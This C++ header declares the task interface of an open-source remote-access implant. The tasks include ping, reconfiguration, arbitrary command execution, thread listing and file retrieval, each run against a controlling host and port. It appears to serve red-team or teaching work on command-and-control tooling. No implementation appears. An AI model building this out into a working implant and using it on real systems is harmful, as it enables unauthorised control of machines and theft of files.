/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * The original author of this code is Josh Lospinoso (@jalospinoso).
 * The unmodified source code can be found here: https://github.com/JLospinoso/cpp-implant
*/
#pragma once

#define _SILENCE_CXX17_C_HEADER_DEPRECATION_WARNING

#include "results.h"

#include <variant>
#include <string>
#include <string_view>

#include <boost/uuid/uuid.hpp>
#include <boost/property_tree/ptree.hpp>


// Define implant configuration
struct Configuration {
	Configuration(double meanDwell, bool isRunning, std::string agent_id);
	const double meanDwell;
	const bool isRunning;
	const std::string agent_id;
};


// Tasks
// ===========================================================================================

// PingTask
// -------------------------------------------------------------------------------------------
struct PingTask {
	PingTask(const boost::uuids::uuid& id,
		const std::string agent_id);
	constexpr static std::string_view key{ "ping" };
	[[nodiscard]] Result run(std::string host, std::string port) const;
	const boost::uuids::uuid id;
	const std::string agent_id;
};


// ConfigureTask
// -------------------------------------------------------------------------------------------
struct ConfigureTask {
	ConfigureTask(const boost::uuids::uuid& id,
		double meanDwell,
		bool isRunning,
		std::string agent_id,
		std::function<void(const Configuration&)> setter);
	constexpr static std::string_view key{ "configure" };
	[[nodiscard]] Result run(std::string host, std::string port) const;
	const boost::uuids::uuid id;
private:
	std::function<void(const Configuration&)> setter;
	const double meanDwell;
	const bool isRunning;
	const std::string agent_id;
};


// ExecuteTask
// -------------------------------------------------------------------------------------------
struct ExecuteTask {
	ExecuteTask(const boost::uuids::uuid& id, std::string agent_id, std::string command);
	constexpr static std::string_view key{ "execute" };
	[[nodiscard]] Result run(std::string host, std::string port) const;
	const boost::uuids::uuid id;
	const std::string agent_id;

private:
	const std::string command;
};


// ListThreadsTask
// -------------------------------------------------------------------------------------------
struct ListThreadsTask {
	ListThreadsTask(const boost::uuids::uuid& id, std::string agent_id, std::string processId);
	constexpr static std::string_view key{ "list-threads" };
	[[nodiscard]] Result run(std::string host, std::string port) const;
	const boost::uuids::uuid id;
	const std::string agent_id;
private:
	const std::string processId;
};

// DownloadFileTask
// -------------------------------------------------------------------------------------------
struct DownloadFileTask {
	DownloadFileTask(const boost::uuids::uuid& id, std::string agent_id, std::string filename, std::string save_as);
	constexpr static std::string_view key{ "get-file" };
	[[nodiscard]] Result run(std::string host, std::string port) const;
	const boost::uuids::uuid id;
	const std::string agent_id;
private:
	const std::string filename;
	const std::string save_as;
};


// ===========================================================================================

// REMEMBER: Any new tasks must be added here too!
using Task = std::variant<PingTask, ConfigureTask, ExecuteTask, ListThreadsTask, DownloadFileTask>;

[[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
	std::function<void(const Configuration&)> setter);
